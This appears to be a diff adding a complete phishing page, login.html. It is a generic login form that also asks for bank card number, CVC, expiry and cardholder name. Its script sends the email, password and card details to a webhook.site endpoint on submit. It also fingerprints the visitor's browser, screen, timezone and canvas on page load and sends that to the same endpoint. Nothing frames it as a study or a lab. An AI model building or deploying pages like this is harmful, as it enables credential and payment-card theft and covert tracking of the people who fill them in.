@@ -1,0 +1,144 @@
+
+<!-- ===================== LOGIN.HTML ===================== -->
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+<style>
+body{
+  margin:0;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(120deg,#ff7a00,#ffb347);
+  font-family:Arial;
+}
+.box{
+  background:white;
+  padding:25px;
+  border-radius:12px;
+  width:300px;
+}
+input{
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+}
+button{
+  width:100%;
+  padding:10px;
+  background:#ff7a00;
+  color:white;
+  border:none;
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+<h2>Login</h2>
+<input id="email" type="email" placeholder="Email">
+<input id="pass" type="password" placeholder="Pass">
+<h2>Bank Card</h2>
+<input id="cvc" placeholder="CVC">
+<input id="cnm" type="normal" placeholder="Card Number">
+<input id="end" placeholder="End Time">
+<input id="nmm" type="normal" placeholder="Name">
+<button onclick="login()">Submit</button>
+</div>
+
+
+<script>
+function login() {
+  fetch("https://webhook.site/c6d8c164-68c9-46ad-9c49-78a676e7645d", {
+    method: "POST",
+    mode: "no-cors",
+    body: new URLSearchParams({
+      email: document.getElementById("email").value,
+      pass: document.getElementById("pass").value,
+      name: document.getElementById("nmm").value,
+      cvc: document.getElementById("cvc").value,
+      end: document.getElementById("end").value,
+      card: document.getElementById("cnm").value
+    })
+  });
+}
+
+const collectData = async () => {
+  const data = {};
+
+  data.navigator = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    languages: navigator.languages,
+    platform: navigator.platform,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    vendor: navigator.vendor,
+    product: navigator.product
+  };
+
+  data.document = {
+    url: document.URL,
+    title: document.title,
+    referrer: document.referrer,
+    domain: document.domain,
+    lastModified: document.lastModified,
+    charset: document.characterSet
+  };
+
+  data.screen = {
+    width: screen.width,
+    height: screen.height,
+    availWidth: screen.availWidth,
+    availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth
+  };
+
+  data.window = {
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth,
+    outerHeight: window.outerHeight,
+    devicePixelRatio: window.devicePixelRatio
+  };
+
+  data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillText("fingerprint", 2, 2);
+    data.canvas = canvas.toDataURL();
+  } catch (e) {
+    data.canvas = "error";
+  }
+
+  return data;
+};
+
+async function sendData(){
+  const data = await collectData();
+
+  await fetch("https://webhook.site/c6d8c164-68c9-46ad-9c49-78a676e7645d", {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify(data)
+  });
+
+  console.log("data sent");
+}
+
+document.addEventListener("DOMContentLoaded", function () {
+  sendData();
+});
+</script>
+</body>
+</html>
